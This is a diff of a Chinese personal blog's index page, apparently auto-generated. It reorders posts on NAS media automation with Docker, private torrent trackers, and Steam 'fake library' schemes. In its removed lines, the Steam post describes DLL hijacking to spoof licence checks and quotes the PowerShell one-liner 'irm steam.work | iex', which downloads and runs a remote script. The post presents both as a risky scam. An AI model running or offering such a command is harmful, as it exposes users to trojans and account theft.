@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-2026/2026-05-18-编译自己的操作系统（基于linux）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-2026/05/2026-05-18-编译自己的操作系统（基于linux）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/05/18/2026/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/" class="article-date">
+    <a href="/2026/05/18/2026/05/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/" class="article-date">
   <time class="dt-published" datetime="2026-05-17T16:00:00.000Z" itemprop="datePublished">2026-05-18</time>
 </a>
     
@@ -89,7 +89,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/18/2026/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/">编译自己的操作系统（基于Linux）</a>
+      <a class="p-name article-title" href="/2026/05/18/2026/05/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/">编译自己的操作系统（基于Linux）</a>
     </h1>
   
 
@@ -238,82 +238,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/18/2026/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/" data-id="cuid_GvZGMQaZDQ2S-cNEG_4e" data-title="编译自己的操作系统（基于Linux）" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-2026/05/2026-05-17-nas自动化影片思路/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" class="article-date">
-  <time class="dt-published" datetime="2026-05-16T16:00:00.000Z" itemprop="datePublished">2026-05-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/">电脑知识</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/">nas自动化影片思路</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>注：本文章主要提供思路和搭建方法</p>
-<p><strong><em>1、准备情况</em></strong></p>
-<p>（1）Docker（用于部署环境）</p>
-<p>（2）nastool（用于管理资源的爬取和下载情况）</p>
-<p>（2）jackeet（用于收集种子库）</p>
-<p>（3）QBittorrent（用于下载资源）</p>
-<p>(4)<a target="_blank" rel="noopener" href="https://www.themoviedb.org/">TMDB的Key</a>（用于刮削的准确性，当然你自己有刮削就不管）</p>
-<p><strong><em>2、部署（本人是飞牛的nas，其他家的根据具体文件调整）</em></strong></p>
-<p>部署的compose</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3.8&quot;</span><br><span class="line"></span><br><span class="line"># 初始化目录&amp;权限服务</span><br><span class="line">services:</span><br><span class="line">  init-setup:</span><br><span class="line">    image: alpine</span><br><span class="line">    container_name: init-setup</span><br><span class="line">    command: &gt;</span><br><span class="line">      sh -c &quot;</span><br><span class="line">      mkdir -p /vol1/1000/docker/&#123;nastools,qbittorrent,jackett&#125; /vol1/1000/影视/下载/&#123;电影,电视剧&#125; /vol1/1000/影视/&#123;电影,电视剧&#125; &amp;&amp;</span><br><span class="line">      chown -R 1000:1000 /vol1/1000</span><br><span class="line">      &quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000:/vol1/1000</span><br><span class="line">    restart: no</span><br><span class="line"></span><br><span class="line"># 影音管理 NAS-Tools</span><br><span class="line">  nastools:</span><br><span class="line">    image: syly948/nastools:2.9.1</span><br><span class="line">    container_name: nastools</span><br><span class="line">    ports:</span><br><span class="line">      - 3000:3000</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/nastools:/config</span><br><span class="line">      - /vol1/1000/影视:/影视</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      UMASK: 022</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    depends_on:</span><br><span class="line">      init-setup:</span><br><span class="line">        condition: service_completed_successfully</span><br><span class="line">      qbittorrent:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">      jackett:</span><br><span class="line">        condition: service_healthy</span><br><span class="line"></span><br><span class="line"># 下载工具 qBittorrent</span><br><span class="line">  qbittorrent:</span><br><span class="line">    image: superng6/qbittorrent</span><br><span class="line">    container_name: qbittorrent</span><br><span class="line">    ports:</span><br><span class="line">      - 8088:8080</span><br><span class="line">      - 6881:6881</span><br><span class="line">      - 6881:6881/udp</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/qbittorrent:/config</span><br><span class="line">      - /vol1/1000/影视/下载:/downloads</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">      WEBUI_PORT: 8080</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    healthcheck:</span><br><span class="line">      test: [&quot;CMD&quot;,&quot;curl&quot;,&quot;-f&quot;,&quot;http://localhost:8080&quot;]</span><br><span class="line">      interval: 30s</span><br><span class="line">      timeout: 10s</span><br><span class="line">      retries: 5</span><br><span class="line"></span><br><span class="line"># 索引聚合 Jackett</span><br><span class="line">  jackett:</span><br><span class="line">    image: linuxserver/jackett</span><br><span class="line">    container_name: jackett</span><br><span class="line">    ports:</span><br><span class="line">      - 9117:9117</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/jackett:/config</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">      AUTO_UPDATE: true</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    healthcheck:</span><br><span class="line">      test: [&quot;CMD&quot;,&quot;curl&quot;,&quot;-f&quot;,&quot;http://localhost:9117/UI/Login&quot;]</span><br><span class="line">      interval: 30s</span><br><span class="line">      timeout: 10s</span><br><span class="line">      retries: 5</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<p>docker-compose up -d</p>
-<p><strong><em>3、调整</em></strong></p>
-<p><strong>Nastools</strong></p>
-<p>访问界面IP:3000</p>
-<p>账号admin</p>
-<p>密码password</p>
-<p>登录界面</p>
-<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-05-17-144047-1024x557.png"></p>
-<p><strong>Jackett</strong></p>
-<p>访问界面IP:9117</p>
-<p>这里你要根据自己的情况添加种子站点，如果没有私有的站点账号，就选择好几个公开的站点就行，如果有不能用的会自动删除的，然后添加好后，复制密钥，粘贴到nastool的设置里的索引器jackeet里测试，成功就行了。</p>
-<p><strong>QBittorrent</strong></p>
-<p>访问界面IP:8088</p>
-<p>账号：admin</p>
-<p>密码：在docker容器的日志里查看，登录后查看</p>
-<p>记得在nastool的设置下载器里面的Qbittorrent也设置好，IP地址和账号密码搞好了，再测试一下，确定就链接好了。</p>
-<p>可以设置一下TMDB那个，可以免费申请的，然后，注意其他的在nastool设置一下，比如做种时间，上传速度这些，不然会被认为的在跑PCDN的。</p>
-<p>之后就看你需求更改就行</p>
-<p><strong><em>4、自动化思路</em></strong></p>
-<p>nastool用于进行整体的管理，jackett作为种子的搜集器，QBittorrent作为下载器，下载到本地，TMDB的key帮助刮削准确性就很高了。</p>
-<p>总结：自动化的方法其实还有很多，比如我之前说的RSS订阅，主要是看你怎么折腾，网上的方法教程还是很多的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" data-id="cuidnKFeVObEKfn4RE9K91wgy" data-title="nas自动化影片思路" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/18/2026/05/2026-05-18-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8Elinux%EF%BC%89/index/" data-id="cuid8mv1v12kZWpLjB7Dgl1Gh" data-title="编译自己的操作系统（基于Linux）" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -388,7 +313,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/17/2026/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" data-id="cuid0wALW8Sd3G5fQ04-bK7D9" data-title="nas自动化影片思路" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/17/2026/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" data-id="cuidM0-Kd26QIUsO6GFvlZObf" data-title="nas自动化影片思路" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -400,14 +325,14 @@
 
 
   
-    <article id="post-2026/05/2026-05-16-关于pt/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-2026/05/2026-05-17-nas自动化影片思路/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" class="article-date">
-  <time class="dt-published" datetime="2026-05-15T16:00:00.000Z" itemprop="datePublished">2026-05-16</time>
+    <a href="/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" class="article-date">
+  <time class="dt-published" datetime="2026-05-16T16:00:00.000Z" itemprop="datePublished">2026-05-17</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/">其他知识</a>
+    <a class="article-category-link" href="/categories/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/">电脑知识</a>
   </div>
 
   </div>
@@ -418,7 +343,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/">关于PT</a>
+      <a class="p-name article-title" href="/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/">nas自动化影片思路</a>
     </h1>
   
 
@@ -426,33 +351,44 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>注：本文章只介绍PT，请不要轻易相信那些什么拉人什么的</p>
-<p><strong><em>PT全称是 Private Tracker（私有种子服务器），本质上是一个封闭、半封闭的种子分享社区。</em></strong></p>
-<p>和你平时用的迅雷、百度网盘、公开BT站有很大不同，个人理解就是那些私人的种子网站，相比于公开BT&#x2F;网盘 这些PT站的公开BT站的资源虽然多，但鱼龙混杂，同一部电影，可能同时存在枪版、低码率、带水印、甚至被植入病毒的版本；网盘下载虽然方便，但热门资源秒传、冷门资源几乎绝迹，而且随时面临版权风险和限速的困扰。而PT站则通过严格的准入和审核机制，从根源上解决了这些问题，基本上在那个社区的都有跑的任务，不会有死种，而且基本上所有的用户都要维护，不然就封号，资源真的很好，这种高质量的体验，也意味着更高的门槛和更严格的规则。公开下载的核心是“索取”，而PT的核心是“分享”。你享受了别人提供的稳定高速下载，就有义务为后来的人提供上传，这种“我为人人，人人为我”的信用体系，才是PT社区能长久运转下去的根基。</p>
-<p>关于PT说的</p>
-<ul>
-<li><p>保种：把下载好的资源挂在服务器&#x2F;NAS上，持续为其他用户上传。保种越久，社区越活跃，你的账号也越安全。</p>
-</li>
-<li><p>分享率（Ratio）：上传量 ÷ 下载量，大部分PT站要求 ≥1.0，也就是“下多少，传多少”。</p>
-</li>
-<li><p>魔力值&#x2F;积分：部分PT站的虚拟货币，可以用来换邀请码、免考核、或者兑换下载券，是“老玩家福利”。</p>
-</li>
-<li><p>考核期：新用户注册后，需要在规定时间内（比如30天）完成指定的上传量&#x2F;分享率要求，不达标会被封号。</p>
-</li>
-<li><p>邀请码：PT站的“入场券”，老用户才能发，你违规被封，邀请你的人也会被牵连，所以没人会随便给陌生人发码。</p>
-</li>
-<li><p>HDSky（天空）：国内最热门的高清PT站之一，资源全、用户多，也是很多新手的目标站。</p>
-</li>
-<li><p>星码（带星星的邀请码）：HDSky里的高级邀请码，只有站内高等级用户（VIP&#x2F;老用户）才有资格发，注册后直接跳过考核期，账号更稳，圈内俗称“星码”。</p>
-</li>
-</ul>
-<p>HDSky像这种都有一定的门槛，一般其注册都很少而且是在节假日才开放，开放时间很短，一般要内部人员推送才行，而且进去了还有上传的任务，不然很快号就没了，所以，一般不要轻信那些什么卖号的。</p>
-<p>总结：相比于BT其PT资源跟好，但是门槛跟高。</p>
+        <p>注：本文章主要提供思路和搭建方法</p>
+<p><strong><em>1、准备情况</em></strong></p>
+<p>（1）Docker（用于部署环境）</p>
+<p>（2）nastool（用于管理资源的爬取和下载情况）</p>
+<p>（2）jackeet（用于收集种子库）</p>
+<p>（3）QBittorrent（用于下载资源）</p>
+<p>(4)<a target="_blank" rel="noopener" href="https://www.themoviedb.org/">TMDB的Key</a>（用于刮削的准确性，当然你自己有刮削就不管）</p>
+<p><strong><em>2、部署（本人是飞牛的nas，其他家的根据具体文件调整）</em></strong></p>
+<p>部署的compose</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3.8&quot;</span><br><span class="line"></span><br><span class="line"># 初始化目录&amp;权限服务</span><br><span class="line">services:</span><br><span class="line">  init-setup:</span><br><span class="line">    image: alpine</span><br><span class="line">    container_name: init-setup</span><br><span class="line">    command: &gt;</span><br><span class="line">      sh -c &quot;</span><br><span class="line">      mkdir -p /vol1/1000/docker/&#123;nastools,qbittorrent,jackett&#125; /vol1/1000/影视/下载/&#123;电影,电视剧&#125; /vol1/1000/影视/&#123;电影,电视剧&#125; &amp;&amp;</span><br><span class="line">      chown -R 1000:1000 /vol1/1000</span><br><span class="line">      &quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000:/vol1/1000</span><br><span class="line">    restart: no</span><br><span class="line"></span><br><span class="line"># 影音管理 NAS-Tools</span><br><span class="line">  nastools:</span><br><span class="line">    image: syly948/nastools:2.9.1</span><br><span class="line">    container_name: nastools</span><br><span class="line">    ports:</span><br><span class="line">      - 3000:3000</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/nastools:/config</span><br><span class="line">      - /vol1/1000/影视:/影视</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      UMASK: 022</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    depends_on:</span><br><span class="line">      init-setup:</span><br><span class="line">        condition: service_completed_successfully</span><br><span class="line">      qbittorrent:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">      jackett:</span><br><span class="line">        condition: service_healthy</span><br><span class="line"></span><br><span class="line"># 下载工具 qBittorrent</span><br><span class="line">  qbittorrent:</span><br><span class="line">    image: superng6/qbittorrent</span><br><span class="line">    container_name: qbittorrent</span><br><span class="line">    ports:</span><br><span class="line">      - 8088:8080</span><br><span class="line">      - 6881:6881</span><br><span class="line">      - 6881:6881/udp</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/qbittorrent:/config</span><br><span class="line">      - /vol1/1000/影视/下载:/downloads</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">      WEBUI_PORT: 8080</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    healthcheck:</span><br><span class="line">      test: [&quot;CMD&quot;,&quot;curl&quot;,&quot;-f&quot;,&quot;http://localhost:8080&quot;]</span><br><span class="line">      interval: 30s</span><br><span class="line">      timeout: 10s</span><br><span class="line">      retries: 5</span><br><span class="line"></span><br><span class="line"># 索引聚合 Jackett</span><br><span class="line">  jackett:</span><br><span class="line">    image: linuxserver/jackett</span><br><span class="line">    container_name: jackett</span><br><span class="line">    ports:</span><br><span class="line">      - 9117:9117</span><br><span class="line">    volumes:</span><br><span class="line">      - /vol1/1000/docker/jackett:/config</span><br><span class="line">    environment:</span><br><span class="line">      PUID: 1000</span><br><span class="line">      PGID: 1000</span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">      AUTO_UPDATE: true</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    healthcheck:</span><br><span class="line">      test: [&quot;CMD&quot;,&quot;curl&quot;,&quot;-f&quot;,&quot;http://localhost:9117/UI/Login&quot;]</span><br><span class="line">      interval: 30s</span><br><span class="line">      timeout: 10s</span><br><span class="line">      retries: 5</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<p>docker-compose up -d</p>
+<p><strong><em>3、调整</em></strong></p>
+<p><strong>Nastools</strong></p>
+<p>访问界面IP:3000</p>
+<p>账号admin</p>
+<p>密码password</p>
+<p>登录界面</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-05-17-144047-1024x557.png"></p>
+<p><strong>Jackett</strong></p>
+<p>访问界面IP:9117</p>
+<p>这里你要根据自己的情况添加种子站点，如果没有私有的站点账号，就选择好几个公开的站点就行，如果有不能用的会自动删除的，然后添加好后，复制密钥，粘贴到nastool的设置里的索引器jackeet里测试，成功就行了。</p>
+<p><strong>QBittorrent</strong></p>
+<p>访问界面IP:8088</p>
+<p>账号：admin</p>
+<p>密码：在docker容器的日志里查看，登录后查看</p>
+<p>记得在nastool的设置下载器里面的Qbittorrent也设置好，IP地址和账号密码搞好了，再测试一下，确定就链接好了。</p>
+<p>可以设置一下TMDB那个，可以免费申请的，然后，注意其他的在nastool设置一下，比如做种时间，上传速度这些，不然会被认为的在跑PCDN的。</p>
+<p>之后就看你需求更改就行</p>
+<p><strong><em>4、自动化思路</em></strong></p>
+<p>nastool用于进行整体的管理，jackett作为种子的搜集器，QBittorrent作为下载器，下载到本地，TMDB的key帮助刮削准确性就很高了。</p>
+<p>总结：自动化的方法其实还有很多，比如我之前说的RSS订阅，主要是看你怎么折腾，网上的方法教程还是很多的。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" data-id="cuid-DTOMyOhbu60KE820cCFt" data-title="关于PT" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/17/2026/05/2026-05-17-nas%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BD%B1%E7%89%87%E6%80%9D%E8%B7%AF/index/" data-id="cuidxUNY6TlVwq12-OT6pubN5" data-title="nas自动化影片思路" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -516,7 +452,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/16/2026/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" data-id="cuidxv5AVVy-7Qey4DxuVHPc6" data-title="关于PT" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/16/2026/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" data-id="cuidk11GGnzvaLrqP3SvPGb_A" data-title="关于PT" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -528,10 +464,10 @@
 
 
   
-    <article id="post-2026/05/2026-05-15-steam假入库/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-2026/05/2026-05-16-关于pt/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" class="article-date">
-  <time class="dt-published" datetime="2026-05-14T16:00:00.000Z" itemprop="datePublished">2026-05-15</time>
+    <a href="/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" class="article-date">
+  <time class="dt-published" datetime="2026-05-15T16:00:00.000Z" itemprop="datePublished">2026-05-16</time>
 </a>
     
   <div class="article-category">
@@ -546,7 +482,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/">steam假入库</a>
+      <a class="p-name article-title" href="/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/">关于PT</a>
     </h1>
   
 
@@ -554,62 +490,33 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>注：本文章主要讲解steam假入库的原理和风险。</p>
-<p>1、原理</p>
-<p>Steam 是本地+云端双重验证的方式：</p>
-<p>1. 云端：账号绑定的 License（许可证），官方数据库记录。<br>2. 本地：-  Steam\steamapps\appmanifest_.acf （清单文件）</p>
+        <p>注：本文章只介绍PT，请不要轻易相信那些什么拉人什么的</p>
+<p><strong><em>PT全称是 Private Tracker（私有种子服务器），本质上是一个封闭、半封闭的种子分享社区。</em></strong></p>
+<p>和你平时用的迅雷、百度网盘、公开BT站有很大不同，个人理解就是那些私人的种子网站，相比于公开BT&#x2F;网盘 这些PT站的公开BT站的资源虽然多，但鱼龙混杂，同一部电影，可能同时存在枪版、低码率、带水印、甚至被植入病毒的版本；网盘下载虽然方便，但热门资源秒传、冷门资源几乎绝迹，而且随时面临版权风险和限速的困扰。而PT站则通过严格的准入和审核机制，从根源上解决了这些问题，基本上在那个社区的都有跑的任务，不会有死种，而且基本上所有的用户都要维护，不然就封号，资源真的很好，这种高质量的体验，也意味着更高的门槛和更严格的规则。公开下载的核心是“索取”，而PT的核心是“分享”。你享受了别人提供的稳定高速下载，就有义务为后来的人提供上传，这种“我为人人，人人为我”的信用体系，才是PT社区能长久运转下去的根基。</p>
+<p>关于PT说的</p>
 <ul>
-<li><p> Steam\config\config.vdf （下载密钥）</p>
+<li><p>保种：把下载好的资源挂在服务器&#x2F;NAS上，持续为其他用户上传。保种越久，社区越活跃，你的账号也越安全。</p>
 </li>
-<li><p>Steam 客户端启动时优先读本地缓存 → 有就显示“已拥有”</p>
+<li><p>分享率（Ratio）：上传量 ÷ 下载量，大部分PT站要求 ≥1.0，也就是“下多少，传多少”。</p>
+</li>
+<li><p>魔力值&#x2F;积分：部分PT站的虚拟货币，可以用来换邀请码、免考核、或者兑换下载券，是“老玩家福利”。</p>
+</li>
+<li><p>考核期：新用户注册后，需要在规定时间内（比如30天）完成指定的上传量&#x2F;分享率要求，不达标会被封号。</p>
+</li>
+<li><p>邀请码：PT站的“入场券”，老用户才能发，你违规被封，邀请你的人也会被牵连，所以没人会随便给陌生人发码。</p>
+</li>
+<li><p>HDSky（天空）：国内最热门的高清PT站之一，资源全、用户多，也是很多新手的目标站。</p>
+</li>
+<li><p>星码（带星星的邀请码）：HDSky里的高级邀请码，只有站内高等级用户（VIP&#x2F;老用户）才有资格发，注册后直接跳过考核期，账号更稳，圈内俗称“星码”。</p>
 </li>
 </ul>
-<p>假入库核心逻辑：不上传云端，在本地骗过客户端然后让他认为你电脑上有了这个游戏。</p>
-<p><strong><em>1、伪造 appmanifest（最基础）</em></strong></p>
-<ul>
-<li><p>手动&#x2F;脚本生成  appmanifest_12345.acf </p>
-</li>
-<li><p>写入  steamapps  文件夹</p>
-</li>
-<li><p>Steam 刷新库 → 直接显示已安装&#x2F;已拥有</p>
-</li>
-<li><p>缺点：不能下载，只能骗库显示</p>
-</li>
-</ul>
-<p><strong><em>2、DLL 劫持（hid.dll &#x2F; steam_api.dll）</em></strong></p>
-<ul>
-<li><p>替换 Steam 目录下  hid.dll  或注入  steam_api64.dll </p>
-</li>
-<li><p>拦截 Steam 验证请求，返回“已授权”假结果</p>
-</li>
-<li><p>可正常下载、玩单机</p>
-</li>
-<li><p>风险最高：红信、盗号、木马</p>
-</li>
-</ul>
-<p><strong><em>3、PowerShell 脚本一键执行（现在最常见）</em></strong></p>
-<p>一般就是（网上几块钱卖的基本上是这玩意）</p>
-<p>irm steam.work | iex  
- </p>
-<p>1、从陌生网站下载脚本&#x2F;恶意程序</p>
